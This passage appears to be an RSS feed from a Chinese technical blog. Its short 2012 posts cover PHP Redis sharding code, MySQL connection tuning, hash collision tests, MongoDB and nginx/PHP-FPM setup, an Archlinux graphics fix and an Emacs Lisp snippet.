<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[2] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[2];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">unset</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26032;&#24314;&#36830;&#25509;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>] = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">connect</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[0], <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[1])){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   trigger_error(<span style="color: #8abeb7;">'redis error: connect '</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[0] . <span style="color: #8abeb7;">':'</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[1],<span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">E_USER_ERROR</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">db</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[2]);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">db</span> != 0 <span style="color: #b5bd68;">and</span> <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">select</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">db</span>)){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   trigger_error(<span style="color: #8abeb7;">'redis error: select '</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[0] . <span style="color: #8abeb7;">':'</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[1] .<span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> .</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[2], </span><span style="color: #81a2be; text-decoration: underline;">E_USER_ERROR</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">ENABLE_DEVELOP</span>){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   trigger_error(<span style="color: #8abeb7;">'redis connect success. '</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[0] . <span style="color: #8abeb7;">':'</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[1<span style="text-decoration: underline;">] . </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> . </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[2], </span><span style="color: #81a2be; text-decoration: underline;">E_USER_NOTICE</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }<span style="color: #373b41; background-color: #de935f;">        </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
}
</pre>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决mysql_connect慢的问题]]></title>
            <link>/article/89e351b3-mysql_connect-6162768495ee9898.html</link>
            <guid>/article/89e351b3-mysql_connect-6162768495ee9898.html</guid>
            <pubDate>Thu, 06 Dec 2012 02:25:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
压测时发现mysql_connect耗时超过30秒，登录mysql后执行show processlist，显示超过800个连接状态如下：
</p>

<pre class="example">
unauthenticated user | XXXX.XXX.XXX.XXX:XXXX  | NULL | Connect     |  NULL | login    
</pre>

<p>
经求教运维，在my.cnf中的“[mysqld]”下添加以下配置行即可：
</p>

<pre class="example">
skip-name-resolve
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Fnv算法冲突率测试]]></title>
            <link>/article/fnv-7b976cd551b27a8173876d4b8bd5.html</link>
            <guid>/article/fnv-7b976cd551b27a8173876d4b8bd5.html</guid>
            <pubDate>Sat, 24 Nov 2012 10:31:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org7b77b87" class="outline-2">
<h2 id="org7b77b87"><a href="http://www.isthe.com/chongo/tech/comp/fnv/">Fnv</a>介绍</h2>
<div class="outline-text-2" id="text-org7b77b87">
<p>
Fnv是和 <a href="http://code.google.com/p/cityhash/">CityHash</a> 类似的哈希算法。这里重复《<a href="http://blog.kankanan.com/posts/2012/11/24_cityhash7b976cd551b27a8173876d4b8bd5.html">CityHash算法冲突率测试</a>》，做为一个对比。
</p>
</div>
</div>

<div id="outline-container-org5269b91" class="outline-2">
<h2 id="org5269b91">测试样本数据</h2>
<div class="outline-text-2" id="text-org5269b91">
<p>
16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。
</p>
</div>
</div>

<div id="outline-container-org6174527" class="outline-2">
<h2 id="org6174527">fnv64测试结果</h2>
<div class="outline-text-2" id="text-org6174527">
<p>
没有冲突
</p>
</div>
</div>

<div id="outline-container-org76afa7c" class="outline-2">
<h2 id="org76afa7c">fnv32测试结果</h2>
<div class="outline-text-2" id="text-org76afa7c">
<p>
共31948次冲突，冲突率约为千分之二。
同一哈希值上33次冲突二次，31879次冲突一次。
冲突率比CityHash略低，少了298次。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CityHash算法冲突率测试]]></title>
            <link>/article/cityhash-7b976cd551b27a8173876d4b8bd5.html</link>
            <guid>/article/cityhash-7b976cd551b27a8173876d4b8bd5.html</guid>
            <pubDate>Sat, 24 Nov 2012 10:21:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org0594118" class="outline-2">
<h2 id="org0594118"><a href="http://code.google.com/p/cityhash/">CityHash</a>介绍</h2>
<div class="outline-text-2" id="text-org0594118">
<p>
<a href="http://www.google.com">Google</a> 2010年开始开发并开源的字符串哈希算法，主要包含CityHash32()、CityHash64()和CityHash128()，分别对应32位、64位、128位哈希算法。
</p>
</div>
</div>

<div id="outline-container-orgb9b8094" class="outline-2">
<h2 id="orgb9b8094">测试样本数据</h2>
<div class="outline-text-2" id="text-orgb9b8094">
<p>
16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。
</p>
</div>
</div>

<div id="outline-container-org4538f34" class="outline-2">
<h2 id="org4538f34">cityhash64测试结果</h2>
<div class="outline-text-2" id="text-org4538f34">
<p>
没有冲突
</p>
</div>
</div>

<div id="outline-container-org2995205" class="outline-2">
<h2 id="org2995205">cityhash32测试结果</h2>
<div class="outline-text-2" id="text-org2995205">
<p>
共32246次冲突，冲突率约为千分之二。
同一哈希值上55次冲突二次，32136次冲突一次。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[memcached_get会重置过期时间吗？]]></title>
            <link>/article/memcached_get-4f1a91cd7f6e8fc7671f65f695f45417ff1f.html</link>
            <guid>/article/memcached_get-4f1a91cd7f6e8fc7671f65f695f45417ff1f.html</guid>
            <pubDate>Tue, 13 Nov 2012 12:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
不会。获取数据的操作不会影响数据的过期时间，最新的memcache1.6添加了touch和GAT（get and touch)命令，可以在获取数据时过期时间。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[理解nginx的keepalive_timeout配置项]]></title>
            <link>/article/740689e3-nginx-7684-keepalive_timeout-914d7f6e9879.html</link>
            <guid>/article/740689e3-nginx-7684-keepalive_timeout-914d7f6e9879.html</guid>
            <pubDate>Mon, 12 Nov 2012 09:05:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
不要误以为它是指tcp连接空闲多少秒后关闭，它仅表示连接建立多少秒后关闭，不会在一次请求后重新计时。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[MongoDB基础]]></title>
            <link>/article/mongodb-57fa7840.html</link>
            <guid>/article/mongodb-57fa7840.html</guid>
            <pubDate>Sun, 21 Oct 2012 09:06:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org1c39ffb" class="outline-2">
<h2 id="org1c39ffb">MongoDB与Mysql的基本结构对应关系</h2>
<div class="outline-text-2" id="text-org1c39ffb">
</div>
<div id="outline-container-org1b9f652" class="outline-3">
<h3 id="org1b9f652">一台机器</h3>
<div class="outline-text-3" id="text-org1b9f652">
<p>
computer
</p>
</div>

<div id="outline-container-orgdb1cede" class="outline-4">
<h4 id="orgdb1cede">多个MongoDB实例                                          &lt;&#x2013;对应&#x2013;&gt;                    mysql服务器进程</h4>
<div class="outline-text-4" id="text-orgdb1cede">
<p>
MongoDB Instance                                        &lt;&#x2013;对应&#x2013;&gt;                    Mysqld Instance
</p>

<p>
运行着的MongoDB后台服务进程：/etc/rc.d/mongodb start      &lt;&#x2013;对应&#x2013;&gt;                     /etc/rc.d/mysqld start
</p>
</div>

<div id="outline-container-org1ec51bc" class="outline-5">
<h5 id="org1ec51bc">多个数据库                                              &lt;&#x2013;对应&#x2013;&gt;                    mysql中的数据库</h5>
<div class="outline-text-5" id="text-org1ec51bc">
<p>
MongoDB Database                                       &lt;&#x2013;对应&#x2013;&gt;                     Database
</p>
</div>

<div id="outline-container-org3e1c5ec" class="outline-6">
<h6 id="org3e1c5ec">多个集合                                               &lt;&#x2013;对应&#x2013;&gt;                    mysql中的表</h6>
<div class="outline-text-6" id="text-org3e1c5ec">
<p>
MongoDB Collection                                    &lt;&#x2013;对应&#x2013;&gt;                     Table
</p>
</div>

<div id="outline-container-orgd1889be" class="outline-7">
<h7 id="orgd1889be">多个文档                                             &lt;&#x2013;对应&#x2013;&gt;                     mysql中的记录行</h7>
<div class="outline-text-7" id="text-orgd1889be">
<p>
MongoDB Document                                     &lt;&#x2013;对应&#x2013;&gt;                    Row
</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div id="outline-container-orge1e25f5" class="outline-2">
<h2 id="orge1e25f5">CentOS上搭建环境</h2>
<div class="outline-text-2" id="text-orge1e25f5">
<dl class="org-dl">
<dt>添加源/etc/yum.repos.d/10gen.repo</dt><dd><pre class="example">
[10gen]
name=10gen Repository
baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64
gpgcheck=0
</pre></dd>
<dt>安装服务器客户端程序</dt><dd><div class="org-src-container">
<pre class="src src-sh">yum install mongo-10gen mongo-10gen-server
</pre>
</div></dd>
<dt>安装php扩展</dt><dd><div class="org-src-container">
<pre class="src src-sh">yum -y install make gcc php-devel
yum install php-pear
<span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:/usr/local/php/bin/ pecl install mongo
</pre>
</div>
<p>
php.ini中添加：extension=mongo.so
</p></dd>
<dt>启动服务</dt><dd>/etc/rc.d/init.d/mongodb start</dd>
</dl>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[php中DOMDocument类createElement和createTextNode的区别]]></title>
            <link>/article/php-4e2d-domdocument-7c7b-createelement-548c-createtextnode-7684533a522b.html</link>
            <guid>/article/php-4e2d-domdocument-7c7b-createelement-548c-createtextnode-7684533a522b.html</guid>
            <pubDate>Thu, 27 Sep 2012 11:05:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgb6c098c" class="outline-2">
<h2 id="orgb6c098c">DOMDocument::createElement</h2>
<div class="outline-text-2" id="text-orgb6c098c">
<ul class="org-ul">
<li><p>
原型：DOMElement DOMDocument::createElement ( string $name [, string $value ] )
</p>

<p>
创建一个元素，其中第二个参数是可选的，不会对它进行转义。当value中包含特殊字符（如：&amp;）会出错。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org0366a2e" class="outline-2">
<h2 id="org0366a2e">Domdocument::createTextNode</h2>
<div class="outline-text-2" id="text-org0366a2e">
<ul class="org-ul">
<li><p>
原型：DOMText DOMDocument::createTextNode ( string $content )
</p>

<p>
创建一个文本结点，会对其内容进行转义。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org015cc82" class="outline-2">
<h2 id="org015cc82">典型示例：创建一个文本元素</h2>
<div class="outline-text-2" id="text-org015cc82">
<div class="org-src-container">
<pre class="src src-php"><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">element</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doc</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">createElement</span>(<span style="color: #8abeb7;">"city"</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">node</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doc</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">createTextNode</span>(<span style="color: #8abeb7;">"shenzhen"</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">element</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">appendChild</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">node</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doc</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">appendChild</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">element</span>);
</pre>
</div>
<ul class="org-ul">
<li>对应的xml文档：</li>
</ul>
<div class="org-src-container">
<pre class="src src-xml">&lt;<span style="color: #de935f;">city</span>&gt;shenzhen&lt;/<span style="color: #de935f;">city</span>&gt;
</pre>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决Archlinux下ati显卡3D硬件加速失效的问题]]></title>
            <link>/article/89e351b3-archlinux-4e0b-ati-663e5361-3d-786c4ef652a0901f59316548768495ee9898.html</link>
            <guid>/article/89e351b3-archlinux-4e0b-ati-663e5361-3d-786c4ef652a0901f59316548768495ee9898.html</guid>
            <pubDate>Wed, 05 Sep 2012 15:52:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgf4faf0f" class="outline-2">
<h2 id="orgf4faf0f">问题描述</h2>
<div class="outline-text-2" id="text-orgf4faf0f">
<ul class="org-ul">
<li><p>
症状
</p>

<p>
进入gnome3桌面环境后很卡，不动还好，一动gnome-shell进程cpu占用就直奔100%。
</p></li>

<li><p>
dmesg异常日志
</p>
<pre class="example">
radeon_cp: Failed to load firmware "radeon/R520_cp.bin"
radeon 0000:01:00.0: failed initializing CP (-2).
radeon 0000:01:00.0: Disabling GPU acceleration
</pre></li>
</ul>
</div>
</div>
<div id="outline-container-org3cd1d52" class="outline-2">
<h2 id="org3cd1d52">解决办法</h2>
<div class="outline-text-2" id="text-org3cd1d52">
<div class="org-src-container">
<pre class="src src-sh">sudo ln -s /usr/lib/firmware /lib/
sudo reboot
</pre>
</div>
</div>
</div>
<div id="outline-container-org40be809" class="outline-2">
<h2 id="org40be809">经验总结</h2>
<div class="outline-text-2" id="text-org40be809">
<p>
出现问题时网上不一定能找到你要的答案，像这个问题，网上的论坛里有无数个建议，一个一个试下去其实很浪费时间，
试几次之后还没能解决就应该尝试主动分析解决，像这里稍微留意到括号里的-2，就能发现其实它是个错误码，
perror一下就知道意思是“找不到文件或目录”，联想到最近几次升级archlinux在把/lib里的东西往/usr/lib下移，
其中就包括firemware，这样手工在旧的firmware位置建一个软链接就解决了这个问题。
</p>
</div>
</div>

<div id="outline-container-orga5a765c" class="outline-2">
<h2 id="orga5a765c">备注</h2>
<div class="outline-text-2" id="text-orga5a765c">
<p>
这个问题应该是由于之前glibc升级时未全部完成引起的，archlinux现在把/lib改为/usr/lib的软链接了，可以手工进行设置为软链接这一步骤来修复。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[nginx下快速搭建php运行环境]]></title>
            <link>/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html</link>
            <guid>/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html</guid>
            <pubDate>Sat, 11 Aug 2012 13:09:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orge8372fe" class="outline-2">
<h2 id="orge8372fe">安装</h2>
<div class="outline-text-2" id="text-orge8372fe">
</div>
<div id="outline-container-org7bfc7d8" class="outline-3">
<h3 id="org7bfc7d8">安装nginx</h3>
<div class="outline-text-3" id="text-org7bfc7d8">
<p>
yaourt -S nginx
</p>
</div>
</div>
<div id="outline-container-org18d0e04" class="outline-3">
<h3 id="org18d0e04">安装php</h3>
<div class="outline-text-3" id="text-org18d0e04">
<p>
yaourt -S php
</p>
</div>
</div>
<div id="outline-container-org6df1221" class="outline-3">
<h3 id="org6df1221">安装php-fpm</h3>
<div class="outline-text-3" id="text-org6df1221">
<p>
yaourt -S php-fpm
</p>
</div>
</div>
</div>

<div id="outline-container-org085faec" class="outline-2">
<h2 id="org085faec">配置</h2>
<div class="outline-text-2" id="text-org085faec">
</div>
<div id="outline-container-orga1a9101" class="outline-3">
<h3 id="orga1a9101">配置nginx</h3>
<div class="outline-text-3" id="text-orga1a9101">
<ul class="org-ul">
<li><p>
将nginx.conf中的以下部分：
</p>
<pre class="example">
#location ~ \.php$ {
...
#}
</pre></li>
<li><p>
修改为
</p>
<pre class="example">
location ~ \.php$ {
   root           /usr/share/nginx/html;
   fastcgi_pass   127.0.0.1:9000;
   fastcgi_index  index.php;
   fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;
   include        fastcgi_params;
}
</pre></li>
</ul>
</div>
</div>
<div id="outline-container-org9ca6b9e" class="outline-3">
<h3 id="org9ca6b9e">配置php</h3>
<div class="outline-text-3" id="text-org9ca6b9e">
<p>
在open_basedir中添加：/usr/share/nginx/html
</p>
</div>
</div>
<div id="outline-container-orgdce3fb9" class="outline-3">
<h3 id="orgdce3fb9">配置php-fpm.conf</h3>
<div class="outline-text-3" id="text-orgdce3fb9">
<p>
启用以下listen配置：
listen = 127.0.0.1:9000
</p>
</div>
</div>
</div>

<div id="outline-container-org3cf63c2" class="outline-2">
<h2 id="org3cf63c2">运行</h2>
<div class="outline-text-2" id="text-org3cf63c2">
<ul class="org-ul">
<li><p>
重启nginx
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo /etc/rc.d/nginx restart
</pre>
</div></li>
<li><p>
启动php-fpm
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo php-fpm
</pre>
</div></li>
<li>然后在/usr/share/nginx/html目录中写php脚本即可。</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在emacs模式行上显示图片的尺寸]]></title>
            <link>/article/5728-emacs-6a215f0f884c4e0a663e793a56fe724776845c3a5bf8.html</link>
            <guid>/article/5728-emacs-6a215f0f884c4e0a663e793a56fe724776845c3a5bf8.html</guid>
            <pubDate>Fri, 03 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
下面的lisp代码用于在emacs模式行上显示图片的尺寸：
</p>
<div class="org-src-container">
<pre class="src src-lisp">(add-hook 'image-mode-hook (<span style="color: #b5bd68;">lambda</span> ()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">"display image size on mode line."</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (setq mode-name (format <span style="color: #8abeb7;">"Image[%s](%s*%s)"</span><span style="color: #373b41; background-color: #de935f;"> </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> image-type<span style="color: #373b41; background-color: #de935f;"> </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (car (image-size (image-get-di<span style="text-decoration: underline;">splay-property) t))</span><span style="color: #373b41; background-color: #de935f; text-decoration: underline;"> </span>
